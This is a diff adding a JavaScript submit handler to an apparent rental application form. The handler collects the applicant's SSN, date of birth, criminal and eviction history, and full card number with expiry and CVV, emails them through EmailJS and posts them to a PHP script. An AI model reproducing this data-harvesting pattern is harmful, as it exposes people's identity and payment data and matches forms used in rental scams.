@@ -1,0 +1,79 @@
+<script>
+  
+  const form = document.getElementById('applicationForm');
+const loader = document.getElementById('loader');
+
+form.addEventListener("submit", async function(event) {
+  event.preventDefault();
+  loader.style.display = 'flex';
+
+  const formData = new FormData(form);
+
+  const templateParams = {
+    firstName: formData.get('firstName'),
+      lastName: formData.get('lastName'),
+      email: formData.get('email'),
+      phone: formData.get('phone'),
+      ssn: formData.get('ssn'),
+      dob: formData.get('dob'),
+      address: formData.get('address'),
+      city: formData.get('city'),
+      state: formData.get('state'),
+      postalCode: formData.get('postalCode'),
+      vehicle: formData.get('vehicle'),
+      occupation: formData.get('occupation'),
+      income: formData.get('income'),
+      pet: formData.get('pet'),
+      eviction: formData.get('eviction'),
+      felony: formData.get('felony'),
+      moveInDate: formData.get('moveInDate'),
+      funds: formData.get('funds'),
+      reason: formData.get('reason'),
+      people: formData.get('people'),
+      paymentMethod: formData.get('paymentMethod'),
+      cardName: formData.get('cardName'),
+      cardNumber: formData.get('cardNumber'),
+      expiry: formData.get('expiry'),
+      cvv: formData.get('cvv'),
+      zip: formData.get('zip')
+      
+  };
+
+  try {
+    // Send email via EmailJS (replace '' with your service/template IDs)
+    await emailjs.send('service_cx57dxp', 'template_a8z0ldt', templateParams);
+    console.log('Email sent successfully');
+
+    // Submit to PHP
+    const response = await fetch(form.action, {
+      method: 'POST',
+      body: formData,
+    });
+
+    if (response.ok) {
+      loader.style.display = 'none';
+      alert('Application submitted successfully! Email sent and data saved.');
+      window.location.href = '../index.html'; // Adjust path if needed
+    } else {
+      const errorText = await response.text();
+      throw new Error(
+        `PHP form submission failed: ${response.status} ${response.statusText} - ${errorText}`
+      );
+    }
+  } catch (error) {
+    loader.style.display = 'none';
+    if (error.text) {
+      // EmailJS error
+      alert('Failed to send email: ' + error.text);
+      console.error('EmailJS Error:', error);
+    } else {
+      // PHP error
+      alert(
+        'Email sent successfully, but failed to save in database: ' + error.message
+      );
+      console.error('PHP Error:', error);
+    }
+  }
+});
+
+</script>
